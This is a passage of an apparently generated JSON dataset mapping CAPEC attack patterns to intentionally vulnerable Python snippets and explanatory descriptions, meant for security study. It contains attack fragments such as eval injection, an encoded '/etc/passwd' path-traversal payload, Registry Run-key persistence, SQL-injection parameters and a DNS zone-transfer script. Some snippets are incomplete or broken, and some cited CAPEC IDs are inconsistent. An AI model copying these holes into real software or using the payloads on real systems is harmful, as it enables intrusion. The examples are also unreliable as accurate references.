        "code_snippet": "user_input = 'user_data'\nglobal_var = None\n\ndef set_global_var(value):\n    global global_var\n    global_var = value\n\n# Simulating user input affecting global variable\nset_global_var(user_input)\n\n# Function that relies on the global variable\ndef process_data():\n    if global_var == 'user_data':\n        print('Processing user data...')\n    else:\n        print('Unknown data')\n\nprocess_data()",
        "description": "This Python code snippet demonstrates the vulnerability of excessive reliance on global variables and improper control of dynamically-identified variables. The `global_var` is declared as a global variable and is set based on user input through the `set_global_var` function. The `process_data` function then relies on this global variable to determine its behavior. This setup is problematic because it allows user input to directly influence the global state of the application, leading to potential security risks. The code embodies the main idea of the deprecated CAPEC-77 by showing how user-controlled variables can manipulate global state, and it highlights related CWEs such as excessive reliance on global variables (CWE-1108) and improper control of dynamically-identified variables (CWE-914)."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "import os\n\n# CWE-180: Validate Before Canonicalize\nuser_input = input('Enter a file path: ')\nif '..' in user_input or user_input.startswith('/'):\n    print('Invalid file path!')\nelse:\n    # Canonicalization step after validation\n    canonical_path = os.path.realpath(user_input)\n    try:\n        with open(canonical_path, 'r') as file:\n            print(file.read())\n    except FileNotFoundError:\n        print('File not found!')\n\n# CWE-95: Eval Injection\nuser_code = input('Enter code to execute: ')\neval(user_code)\n\n# CWE-915: Improperly Controlled Modification of Object Attributes\nclass User:\n    def __init__(self, username, role):\n        self.username = username\n        self.role = role\n\nuser = User('admin', 'admin')\nuser_input = input('Enter attribute to modify (username/role): ')\nnew_value = input('Enter new value: ')\nsetattr(user, user_input, new_value)\nprint(f'User {user.username} now has role {user.role}')",
        "description": "This Python code snippet demonstrates several security vulnerabilities related to the deprecated CAPEC 'Manipulate Canonicalization' and its associated CWEs. \n\n1. **CWE-180: Validate Before Canonicalize** - The code validates the user input for a file path before canonicalizing it. This can lead to bypassing the validation if the input is manipulated to be valid before canonicalization but invalid after.\n\n2. **CWE-95: Eval Injection** - The code takes user input and directly evaluates it using `eval()`, which can lead to arbitrary code execution if the input is not properly sanitized.\n\n3. **CWE-915: Improperly Controlled Modification of Object Attributes** - The code allows user input to modify attributes of a `User` object without proper control, which can lead to unauthorized changes to the object's state.\n\nThese examples illustrate the risks of improper input handling and validation, especially when dealing with canonicalization, dynamic code evaluation, and object attribute modification."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "import os\nimport urllib.parse\n\n# Vulnerable function that takes user input for a file path\n\ndef vulnerable_function(user_input):\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError(\"Invalid input\")\n\n    # CWE-180: Validate Before Canonicalize\n    if \"..\" in user_input or \"//\" in user_input:\n        raise ValueError(\"Invalid path\")\n\n    # CWE-173: Improper Handling of Alternate Encoding\n    decoded_input = urllib.parse.unquote(user_input)\n\n    # CWE-73: External Control of File Name or Path\n    file_path = os.path.join(\"/safe/directory\", decoded_input)\n\n    # CWE-74: Improper Neutralization of Special Elements\n    with open(file_path, \"r\") as file:\n        data = file.read()\n        print(data)\n\n# Example usage\nuser_input = \"%2e%2e%2f%2e%2e%2fetc%2fpasswd\"  # Encoded path traversal attack\nvulnerable_function(user_input)",
        "description": "This Python code snippet demonstrates a vulnerable function that takes user input for a file path. The function attempts to validate the input but does so before decoding it (CWE-180). It also improperly handles alternate encoding (CWE-173) by decoding the input after validation, allowing an attacker to bypass the validation checks. The function constructs a file path using the decoded input (CWE-73) and does not properly neutralize special elements (CWE-74), leading to potential security risks such as path traversal attacks. The example usage shows an encoded path traversal attack that could exploit these vulnerabilities."
    },
    {
        "capec_id": "268",
        "capec_name": "Audit Log Manipulation",
        "code_snippet": "import logging\nimport os\n\n# Setup logging\nlogging.basicConfig(filename='app.log', level=logging.INFO)\n\n# Function to simulate logging sensitive information\ndef log_sensitive_info(user_id, password):\n    logging.info(f'User ID: {user_id}, Password: {password}')\n\n# Function to simulate log manipulation\ndef manipulate_log():\n    with open('app.log', 'a') as log_file:\n        log_file.write('INFO: User ID: admin, Password: admin123\\n')\n\n# Simulate logging sensitive information\nlog_sensitive_info('user123', 'pass123')\n\n# Simulate log manipulation by an attacker\nmanipulate_log()\n\n# Read and print log file to show manipulation\nwith open('app.log', 'r') as log_file:\n    print(log_file.read())",
        "description": "This Python code snippet demonstrates a scenario where an attacker can manipulate audit logs. The code sets up a basic logging mechanism and includes a function to log sensitive information (CWE-532). Another function simulates log manipulation by directly appending a forged log entry to the log file (CWE-117). The code then logs some sensitive information and manipulates the log file to cover tracks or mislead an audit. Finally, it reads and prints the log file to show the manipulated entries. This example highlights the vulnerabilities associated with insufficient access controls and improper output neutralization in logging mechanisms, as described in the CAPEC."
    },
    {
        "capec_id": "269",
        "capec_name": "DEPRECATED: Registry Manipulation",
        "code_snippet": "import winreg\n\n# CWE-314: Cleartext Storage in the Registry\n# This code stores sensitive information in cleartext in the Windows Registry\n\ntry:\n    registry_key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\\MyApp')\n    winreg.SetValueEx(registry_key, 'SensitiveData', 0, winreg.REG_SZ, 'my_secret_password')\n    winreg.CloseKey(registry_key)\n    print('Sensitive data stored in registry.')\nexcept WindowsError as e:\n    print(f'Failed to write to registry: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to CAPEC-203: Manipulate Application Registry Values. Specifically, it embodies CWE-314: Cleartext Storage in the Registry. The code stores sensitive information ('my_secret_password') in cleartext within the Windows Registry under the key 'HKEY_CURRENT_USER\\Software\\MyApp'. This practice is insecure as it exposes sensitive data to potential unauthorized access. The code highlights the risk of storing sensitive information in an unprotected manner within the registry."
    },
    {
        "capec_id": "270",
        "capec_name": "Modification of Registry Run Keys",
        "code_snippet": "import winreg\n\n# CWE-15: External Control of System or Configuration Setting\n# CWE-314: Cleartext Storage in the Registry\n# CWE-520: .NET Misconfiguration: Use of Impersonation\n\n# Path to the registry key\nrun_key_path = r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'\n\n# Name of the new registry entry\nentry_name = 'MaliciousApp'\n\n# Path to the executable to run\nexecutable_path = r'C:\\Path\\To\\MaliciousApp.exe'\n\ntry:\n    # Open the registry key\n    with winreg.OpenKey(winreg.HKEY_CURRENT_USER, run_key_path, 0, winreg.KEY_SET_VALUE) as key:\n        # Set the value in the registry (CWE-314: Cleartext Storage in the Registry)\n        winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, executable_path)\n        print(f'Successfully added {entry_name} to run keys.')\nexcept Exception as e:\n    print(f'Failed to modify registry: {e}')",
        "description": "This Python code snippet demonstrates how an adversary can add a new entry to the Windows registry 'run keys' to ensure that a malicious application is executed when a user logs in. The code uses the 'winreg' module to open the registry key and set a new value, which points to the path of the malicious executable. This embodies the CAPEC of 'Modification of Registry Run Keys' by showing how an attacker can achieve persistence on a target system. The code also touches on related CWEs: CWE-15 (External Control of System or Configuration Setting) by allowing external modification of the registry, and CWE-314 (Cleartext Storage in the Registry) by storing the executable path in cleartext."
    },
    {
        "capec_id": "271",
        "capec_name": "Schema Poisoning",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Load XML schema from an external source\nschema_url = 'http://example.com/schema.xsd'\nschema_content = requests.get(schema_url).text\n\n# Parse the schema\nschema_tree = ET.ElementTree(ET.fromstring(schema_content))\n\n# Malicious modification of the schema\nfor elem in schema_tree.iter():\n    if elem.tag == 'element' and elem.attrib.get('name') == 'password':\n        elem.attrib['type'] = 'string'  # Change type to string to bypass validation\n\n# Use the modified schema to validate an XML document\nxml_content = '''<user><username>admin</username><password>12345</password></user>'''\nxml_tree = ET.ElementTree(ET.fromstring(xml_content))\n\n# Validate XML against the modified schema (this is a simplified example)\nschema_tree.write('modified_schema.xsd')\n\n# This would normally be a validation step, but here we just print the modified schema\nprint(ET.tostring(schema_tree.getroot(), encoding='unicode'))",
        "description": "This Python code snippet demonstrates a schema poisoning attack. It loads an XML schema from an external source, modifies it maliciously by changing the type of a 'password' element to 'string', and then uses this modified schema to validate an XML document. This can lead to security vulnerabilities such as bypassing validation checks. The code embodies the main idea of CAPEC-170 (Schema Poisoning) and incorporates related CWEs like CWE-15 (External Control of System or Configuration Setting) and CWE-501 (Trust Boundary Violation)."
    },
    {
        "capec_id": "272",
        "capec_name": "Protocol Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable server code\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('0.0.0.0', 12345))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    print(f'Connection from {addr}')\n    data = client_socket.recv(1024)\n    if data:\n        # Improper verification of source (CWE-940)\n        if data == b'auth_request':\n            client_socket.send(b'auth_response')\n        # No integrity check (CWE-924)\n        elif data == b'command':\n            client_socket.send(b'command_ack')\n    client_socket.close()",
        "description": "This Python code snippet represents a vulnerable server that listens for incoming connections and processes requests without proper security measures. The server does not verify the source of the communication (CWE-940), making it susceptible to impersonation attacks. Additionally, it does not enforce message integrity (CWE-924), allowing an attacker to modify messages during transmission. The code demonstrates how an adversary could exploit these weaknesses to manipulate the protocol, impersonate users, or control the session outcome, embodying the main idea of CAPEC-272 (Protocol Manipulation)."
    },
    {
        "capec_id": "273",
        "capec_name": "HTTP Response Smuggling",
        "code_snippet": "import socket\n\n# Vulnerable HTTP server\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(5)\n\nwhile True:\n    client_socket, addr = server_socket.accept()\n    request = client_socket.recv(1024).decode('utf-8')\n    print(f'Received request: {request}')\n\n    # Improper neutralization of CRLF sequences (CWE-113)\n    if 'Content-Length' in request:\n        headers, body = request.split('\\r\\n\\r\\n', 1)\n        content_length = int(headers.split('Content-Length: ')[1].split('\\r\\n')[0])\n        body = body[:content_length]\n    else:\n        headers, body = request, ''\n\n    # Vulnerable response construction\n    response = f'HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\nContent-Length: {len(body)}\\r\\n\\r\\n{body}'\n    client_socket.sendall(response.encode('utf-8'))\n\n    # HTTP Response Smuggling vulnerability\n    malicious_response = 'HTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\nContent-Length: 13\\r\\n\\r\\nHello, World!\\r\\nHTTP/1.1 200 OK\\r\\nContent-Type: text/plain\\r\\nContent-Length: 13\\r\\n\\r\\nHacked!'\n    client_socket.sendall(malicious_response.encode('utf-8'))\n\n    client_socket.close()",
        "description": "This Python code snippet demonstrates a vulnerable HTTP server that is susceptible to HTTP Response Smuggling attacks. The server improperly neutralizes CRLF sequences (CWE-113) when processing incoming HTTP requests. It constructs HTTP responses without properly handling special elements, leading to potential injection vulnerabilities (CWE-74). The code also shows how an attacker could exploit this vulnerability by sending a malicious response that includes multiple HTTP responses, causing an interpretation conflict (CWE-436) and inconsistent interpretation of HTTP requests/responses (CWE-444). This can lead to unauthorized responses being sent to clients, embodying the main idea of HTTP Response Smuggling (CAPEC-33)."
    },
    {
        "capec_id": "274",
        "capec_name": "HTTP Verb Tampering",
        "code_snippet": "from flask import Flask, request, abort\n\napp = Flask(__name__)\n\n@app.route('/admin', methods=['GET'])\ndef admin_panel():\n    if request.method != 'GET':\n        abort(403)  # Only allow GET requests\n    # Simulate sensitive data access\n    return 'Sensitive admin data'\n\n@app.route('/user', methods=['GET', 'POST'])\ndef user_panel():\n    if request.method == 'POST':\n        # Simulate sensitive data access via POST\n        return 'Sensitive user data'\n    return 'User data'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application with two routes: '/admin' and '/user'. The '/admin' route is intended to be accessed only via the GET method, and any other HTTP verb will result in a 403 Forbidden error. However, this simplistic check can be bypassed if the application does not properly handle other HTTP verbs or unexpected input, embodying the concept of HTTP Verb Tampering (CAPEC-111). The '/user' route allows both GET and POST methods, but sensitive data is returned via POST, which can be exploited if the application does not properly secure the POST method. This demonstrates CWE-598 (Use of GET Request Method With Sensitive Query Strings) and CWE-654 (Reliance on a Single Factor in a Security Decision). The code highlights the importance of properly validating and securing HTTP methods to prevent unauthorized access to sensitive data."
    },
    {
        "capec_id": "275",
        "capec_name": "DNS Rebinding",
        "code_snippet": "import socket\nimport http.server\nimport threading\n\nclass RebindingHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):\n    def do_GET(self):\n        if self.path == '/rebind':\n            # Simulate DNS rebinding by changing the IP address\n            self.server.server_address = ('192.168.1.100', self.server.server_address[1])\n            self.send_response(200)\n            self.end_headers()\n            self.wfile.write(b'Rebinding to internal IP')\n        else:\n            super().do_GET()\n\n# Bind to all IP addresses (CWE-1327)\nserver_address = ('0.0.0.0', 8080)\nhttpd = http.server.HTTPServer(server_address, RebindingHTTPRequestHandler)\n\n# Start the server in a separate thread\nthread = threading.Thread(target=httpd.serve_forever)\nthread.daemon = True\nthread.start()\n\nprint(f'Server started on {server_address[0]}:{server_address[1]}')\n\n# Simulate a client request to trigger DNS rebinding\nimport requests\nresponse = requests.get('http://localhost:8080/rebind')\nprint(response.text)\n\n# Simulate a client request to the new internal IP\nresponse = requests.get('http://192.168.1.100:8080')\nprint(response.text)",
        "description": "This Python code snippet demonstrates a simplified DNS rebinding attack. The `RebindingHTTPRequestHandler` class handles HTTP GET requests and simulates DNS rebinding by changing the server's IP address to an internal IP (192.168.1.100) when the '/rebind' path is accessed. The server is bound to all IP addresses (0.0.0.0), which is a common misconfiguration (CWE-1327). The code starts an HTTP server in a separate thread and simulates client requests to trigger the DNS rebinding. The first request to '/rebind' changes the server's IP address, and the second request attempts to access the server at the new internal IP address. This demonstrates how an attacker can manipulate DNS resolution to access internal network resources."
    },
    {
        "capec_id": "276",
        "capec_name": "Inter-component Protocol Manipulation",
        "code_snippet": "import socket\n\n# Vulnerable function to send sensitive data over a network\n# CWE-319: Cleartext Transmission of Sensitive Information\ndef send_sensitive_data(data):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect(('example.com', 80))\n        s.sendall(data.encode('utf-8'))\n\n# Vulnerable function to receive data without integrity check\n# CWE-924: Improper Enforcement of Message Integrity During Transmission in a Communication Channel\ndef receive_data():\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.bind(('0.0.0.0', 8080))\n        s.listen()\n        conn, addr = s.accept()\n        with conn:\n            data = conn.recv(1024)\n            return data.decode('utf-8')\n\n# Example usage\nsensitive_info = 'password123'\nsend_sensitive_data(sensitive_info)\nreceived_info = receive_data()\nprint(f'Received: {received_info}')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of inter-component communication, embodying the main idea of CAPEC-460: Inter-component Protocol Manipulation. The `send_sensitive_data` function transmits sensitive information in cleartext (CWE-319), making it susceptible to interception by unauthorized actors. The `receive_data` function receives data without verifying its integrity (CWE-924), allowing potential manipulation of the data during transmission. These vulnerabilities highlight the risks associated with improper handling of inter-component protocols, such as unauthorized access, data leakage, and session control by adversaries."
    },
    {
        "capec_id": "277",
        "capec_name": "Data Interchange Protocol Manipulation",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Sample XML data with sensitive information\nxml_data = '''\n<order>\n    <customer>\n        <name>John Doe</name>\n        <credit_card>1234-5678-9012-3456</credit_card>\n    </customer>\n    <items>\n        <item>\n            <id>1</id>\n            <name>Widget</name>\n            <price>19.99</price>\n        </item>\n    </items>\n</order>\n'''\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        return root\n    except ET.ParseError as e:\n        print(f\"Error parsing XML: {e}\")\n        return None\n\n# Function to manipulate XML data\n# CWE-707: Improper Neutralization\n# CWE-201: Insertion of Sensitive Information Into Sent Data\n# CWE-302: Authentication Bypass by Assumed-Immutable Data\n\ndef manipulate_xml(data):\n    root = parse_xml(data)\n    if root is not None:\n        # CWE-201: Inserting sensitive information into sent data\n        sensitive_info = ET.SubElement(root, 'sensitive')\n        sensitive_info.text = 'Sensitive Data'\n\n        # CWE-302: Authentication Bypass by modifying assumed-immutable data\n        for customer in root.findall('customer'):\n            name = customer.find('name')\n            if name is not None:\n                name.text = 'Attacker'\n\n        # CWE-707: Improper Neutralization\n        manipulated_data = ET.tostring(root, encoding='unicode')\n        return manipulated_data\n    return None\n\n# Manipulate the XML data\nmanipulated_xml = manipulate_xml(xml_data)\nif manipulated_xml:\n    print(manipulated_xml)\n",
        "description": "This Python code snippet demonstrates a vulnerable implementation of XML data manipulation, embodying the main idea of CAPEC-272: Data Interchange Protocol Manipulation. The code parses an XML string containing sensitive information and then manipulates it in several ways that reflect common weaknesses (CWEs) associated with this type of attack.\n\n1. **CWE-707: Improper Neutralization** - The code does not properly ensure that the XML data is well-formed or secure before processing it.\n2. **CWE-201: Insertion of Sensitive Information Into Sent Data** - The code inserts additional sensitive information into the XML data, which should not be exposed.\n3. **CWE-302: Authentication Bypass by Assumed-Immutable Data** - The code modifies the 'name' field of the customer, which could be assumed to be immutable, allowing an attacker to impersonate another user.\n\nThe `manipulate_xml` function demonstrates how an attacker could exploit these weaknesses to manipulate the XML data, potentially leading to unauthorized access or data leakage."
    },
    {
        "capec_id": "278",
        "capec_name": "Web Services Protocol Manipulation",
        "code_snippet": "import requests\n\n# CWE-602: Client-Side Enforcement of Server-Side Security\n# CWE-707: Improper Neutralization\n# CWE-573: Improper Following of Specification by Caller\n\n# Vulnerable web service endpoint\nurl = 'http://example.com/api/getUserData'\n\n# CWE-707: Manipulating call parameters to include unexpected values\nparams = {\n    'userId': '1 OR 1=1'  # SQL Injection attempt\n}\n\n# CWE-602: Client-side enforcement bypass\n# Assuming the client is supposed to enforce certain restrictions\nresponse = requests.get(url, params=params)\n\n# CWE-573: Improper following of specification\n# The server might not properly handle the unexpected parameter value\nif response.status_code == 200:\n    print('Data:', response.text)\nelse:\n    print('Failed to retrieve data')",
        "description": "This Python code snippet demonstrates a web service protocol manipulation attack. The code sends a request to a vulnerable web service endpoint with manipulated parameters. Specifically, it includes an SQL injection attempt in the 'userId' parameter (CWE-707). The server-side security is assumed to be enforced by the client (CWE-602), which is bypassed in this example. The server may not properly handle the unexpected parameter value (CWE-573), potentially leading to unauthorized data access or other unintended behavior. This snippet embodies the main idea of CAPEC-252 by showing how an adversary can manipulate web service protocols to cause unintended reactions from the application or service."
    },
    {
        "capec_id": "279",
        "capec_name": "SOAP Manipulation",
        "code_snippet": "import requests\n\n# SOAP request with potential vulnerabilities\nsoap_request = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservices\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:Login>\n         <username>admin</username>\n         <password>password</password>\n      </web:Login>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\n# Sending the SOAP request to the server\nresponse = requests.post('http://example.com/webservices', data=soap_request, headers={'Content-Type': 'text/xml'})\n\n# Print the response from the server\nprint(response.text)\n",
        "description": "This Python code snippet demonstrates a SOAP request that is vulnerable to several issues described in the CAPEC and related CWEs. The SOAP request is sent to a server without proper validation or neutralization of the input, making it susceptible to SOAP manipulation attacks (CWE-707). The request includes sensitive information (username and password) that could be intercepted and replayed by an attacker (CWE-294). Additionally, the server relies on the client to enforce security, which can be bypassed by modifying the client (CWE-602, CWE-603). The code also does not handle XML External Entity (XXE) attacks, which could lead to the inclusion of unintended external resources (CWE-611)."
    },
    {
        "capec_id": "280",
        "capec_name": "DEPRECATED: SOAP Parameter Tampering",
        "code_snippet": "import requests\n\n# Vulnerable SOAP request\nwsdl_url = 'http://example.com/service?wsdl'\n\n# Exposing WSDL file containing sensitive information\nresponse = requests.get(wsdl_url)\nprint(response.text)\n\n# SOAP request with parameter tampering\nsoap_body = '''\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:web=\"http://example.com/webservice\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <web:Login>\n         <web:username>admin</web:username>\n         <web:password>password</web:password>\n      </web:Login>\n   </soapenv:Body>\n</soapenv:Envelope>\n'''\n\nheaders = {'Content-Type': 'text/xml'}\n\n# Sending the tampered SOAP request\nresponse = requests.post('http://example.com/service', data=soap_body, headers=headers)\nprint(response.text)\n\n# Capture-replay attack\nreplay_response = requests.post('http://example.com/service', data=soap_body, headers=headers)\nprint(replay_response.text)\n",
        "description": "This Python code snippet demonstrates a SOAP parameter tampering attack, which is deprecated and included in CAPEC-279: SOAP Manipulation. The code first exposes a WSDL file containing sensitive information (CWE-651). It then sends a SOAP request with tampered parameters, attempting to log in with hardcoded credentials. Finally, it performs a capture-replay attack (CWE-294) by resending the same SOAP request, potentially bypassing authentication. This code highlights the vulnerabilities associated with improper handling of SOAP requests and the exposure of sensitive WSDL files."
    },
    {
        "capec_id": "285",
        "capec_name": "ICMP Echo Request Ping",
        "code_snippet": "import os\nimport socket\n\n# Function to send ICMP Echo Request (Ping)\ndef send_ping(target_ip):\n    # Create a raw socket\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    \n    # ICMP Header: Type (8), Code (0), Checksum (0), Identifier (0), Sequence Number (0)\n    icmp_header = b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00'\n    \n    # Send ICMP Echo Request\n    sock.sendto(icmp_header, (target_ip, 1))\n    \n    # Receive ICMP Echo Reply\n    response, _ = sock.recvfrom(1024)\n    \n    # Check if the response is an ICMP Echo Reply (Type 0)\n    if response[20] == 0:\n        print(f'Received ICMP Echo Reply from {target_ip}')\n    else:\n        print(f'No ICMP Echo Reply from {target_ip}')\n\n# Target IP address\ntarget_ip = '192.168.1.1'\n\n# Send Ping\nsend_ping(target_ip)",
        "description": "This Python code snippet demonstrates how to send an ICMP Echo Request (Ping) to a target IP address and check for an ICMP Echo Reply. The code creates a raw socket, constructs an ICMP header, sends the ICMP Echo Request, and waits for an ICMP Echo Reply. If a reply is received, it confirms that the target is responsive. This code embodies the main idea of the CAPEC by illustrating how an adversary might use a Ping to determine if a target system is responsive. The related CWEs provide additional context, such as the potential exposure of sensitive information (CWE-200) and the cleartext transmission of data (CWE-319), which can be exploited by unauthorized actors."
    },
    {
        "capec_id": "287",
        "capec_name": "TCP SYN Scan",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Target IP address\ntarget_ip = '192.168.1.1'\n\n# Function to perform SYN scan\ndef syn_scan(target_ip):\n    for port in range(1, 1024):\n        # Create a TCP packet with SYN flag\n        packet = create_syn_packet(target_ip, port)\n        sock.sendto(packet, (target_ip, port))\n        response = sock.recvfrom(1024)\n        if is_open(response):\n            print(f'Port {port} is open')\n\n# Placeholder function to create a SYN packet\ndef create_syn_packet(target_ip, port):\n    # This function should create a TCP packet with SYN flag set\n    # For simplicity, we return a dummy packet\n    return b'\\x00' * 20\n\n# Placeholder function to check if port is open\ndef is_open(response):\n    # This function should analyze the response to determine if the port is open\n    # For simplicity, we assume all ports are closed\n    return False\n\n# Perform SYN scan\nsyn_scan(target_ip)",
        "description": "This Python code snippet demonstrates a basic TCP SYN scan, which is a common technique used by adversaries to determine the status of ports on a remote target. The code creates a raw socket and sends SYN packets to a range of ports on the target IP address. The `create_syn_packet` function is a placeholder for creating a TCP packet with the SYN flag set, and the `is_open` function is a placeholder for analyzing the response to determine if the port is open. This code embodies the main idea of the CAPEC by illustrating how an adversary might perform a SYN scan to gather information about open ports on a target system. The related CWEs provide additional context, such as the potential exposure of sensitive information (CWE-200) and the risk of excessive attack surface (CWE-1125)."
    },
    {
        "capec_id": "288",
        "capec_name": "DEPRECATED: ICMP Echo Request Ping",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# ICMP Echo Request (Ping) Packet\nICMP_ECHO_REQUEST = 8\n\n# Function to calculate checksum\ndef checksum(source_string):\n    sum = 0\n    count_to = (len(source_string) // 2) * 2\n    count = 0\n    while count < count_to:\n        this_val = source_string[count + 1] * 256 + source_string[count]\n        sum = sum + this_val\n        sum = sum & 0xffffffff\n        count = count + 2\n    if count_to < len(source_string):\n        sum = sum + source_string[len(source_string) - 1]\n        sum = sum & 0xffffffff\n    sum = (sum >> 16) + (sum & 0xffff)\n    sum = sum + (sum >> 16)\n    answer = ~sum\n    answer = answer & 0xffff\n    answer = answer >> 8 | (answer << 8 & 0xff00)\n    return answer\n\n# Function to create an ICMP packet\ndef create_packet(id):\n    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, id, 1)\n    data = struct.pack('d', time.time())\n    my_checksum = checksum(header + data)\n    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), id, 1)\n    return header + data\n\n# Function to send ICMP Echo Request\ndef send_ping(dest_addr, timeout=1):\n    try:\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        packet_id = int((id(timeout) * time.time()) % 65535)\n        packet = create_packet(packet_id)\n        sock.sendto(packet, (dest_addr, 1))\n        sock.close()\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\nsend_ping('8.8.8.8')",
        "description": "This Python code snippet demonstrates the creation and sending of an ICMP Echo Request (Ping) packet, which is the main idea behind the deprecated CAPEC-285 attack pattern. The code constructs an ICMP packet, calculates its checksum, and sends it to a specified destination address. This type of code can be used in network diagnostics but can also be exploited for network reconnaissance or denial-of-service attacks. The related CWEs provide additional context, such as the potential for capture-replay attacks (CWE-294) if the ICMP packets are intercepted and replayed, and the use of non-ubiquitous APIs (CWE-589) which may cause compatibility issues across different platforms."
    },
    {
        "capec_id": "289",
        "capec_name": "DEPRECATED: Infrastructure-based footprinting",
        "code_snippet": "import os\nimport subprocess\n\ndef check_authentication(user):\n    # CWE-287: Improper Authentication\n    if user == 'admin':\n        return True\n    return False\n\n# CWE-1316: Overlapping protected and unprotected regions\ndef access_protected_resource(user):\n    if check_authentication(user):\n        # Simulate access to a protected resource\n        print('Access granted to protected resource')\n    else:\n        # Simulate access to an unprotected resource\n        print('Access granted to unprotected resource')\n\n# CWE-1229: Creation of Emergent Resource\n# Simulate creation of a temporary file that could be exploited\ndef create_temp_file():\n    temp_file = '/tmp/tempfile.txt'\n    with open(temp_file, 'w') as f:\n        f.write('Temporary data')\n    return temp_file\n\n# Main function to demonstrate the vulnerabilities\nif __name__ == '__main__':\n    user = 'guest'\n    access_protected_resource(user)\n    temp_file = create_temp_file()\n    print(f'Temporary file created at: {temp_file}')\n    # Potentially dangerous operation\n    subprocess.run(['cat', temp_file])",
        "description": "This Python code snippet demonstrates several vulnerabilities based on the provided CAPEC and related CWEs. The `check_authentication` function represents CWE-287 (Improper Authentication) by allowing access based on a simple user check. The `access_protected_resource` function simulates CWE-1316 (Overlapping protected and unprotected regions) by granting access to resources based on the authentication check. The `create_temp_file` function represents CWE-1229 (Creation of Emergent Resource) by creating a temporary file that could be exploited. The main function demonstrates these vulnerabilities by attempting to access resources and creating a temporary file, which is then read using a potentially dangerous subprocess call."
    },
    {
        "capec_id": "290",
        "capec_name": "Enumerate Mail Exchange (MX) Records",
        "code_snippet": "import dns.resolver\n\n# Function to enumerate MX records for a given domain\ndef enumerate_mx_records(domain):\n    try:\n        # Query MX records\n        answers = dns.resolver.resolve(domain, 'MX')\n        mx_records = []\n        for rdata in answers:\n            mx_records.append((rdata.exchange.to_text(), rdata.preference))\n        return mx_records\n    except Exception as e:\n        print(f\"Error: {e}\")\n        return None\n\n# Example usage\ndomain = 'example.com'\nmx_records = enumerate_mx_records(domain)\nif mx_records:\n    for record in mx_records:\n        print(f\"MX Record: {record[0]}, Preference: {record[1]}\")",
        "description": "This Python code snippet demonstrates how to enumerate MX (Mail Exchange) records for a given domain using the 'dns.resolver' module. The function 'enumerate_mx_records' takes a domain name as input and performs a DNS query to retrieve the MX records. The results include the mail server names and their preferences. This process can reveal sensitive information about the network's mail servers, which may be located within a DMZ and protected by a firewall. The code embodies the main idea of CAPEC-Enumerate Mail Exchange (MX) Records and highlights potential weaknesses such as exposure of sensitive information (CWE-200) and reliance on DNS resolution for security-critical actions (CWE-350)."
    },
    {
        "capec_id": "291",
        "capec_name": "DNS Zone Transfers",
        "code_snippet": "import dns.resolver\nimport dns.query\nimport dns.zone\n\n# Vulnerable DNS server address\nvulnerable_dns_server = '192.0.2.1'\n\n# Domain to perform zone transfer on\ndomain = 'example.com'\n\ntry:\n    # Perform a DNS zone transfer\n    zone = dns.zone.from_xfr(dns.query.xfr(vulnerable_dns_server, domain))\n    for name, node in zone.nodes.items():\n        print(zone[name].to_text(name))\nexcept Exception as e:\n    print(f'Zone transfer failed: {e}')",
        "description": "This Python code snippet demonstrates a DNS zone transfer attack, which exploits a misconfigured DNS server that allows zone transfers. The code attempts to transfer the DNS zone data from a specified vulnerable DNS server for a given domain. If successful, it prints out the zone data, which may include sensitive information about the network topology, IP addresses, and hostnames. This represents the main idea of CAPEC-137 (DNS Zone Transfers) and highlights CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) by potentially exposing internal network details to an unauthorized actor."
    },
    {
        "capec_id": "292",
        "capec_name": "Host Discovery",
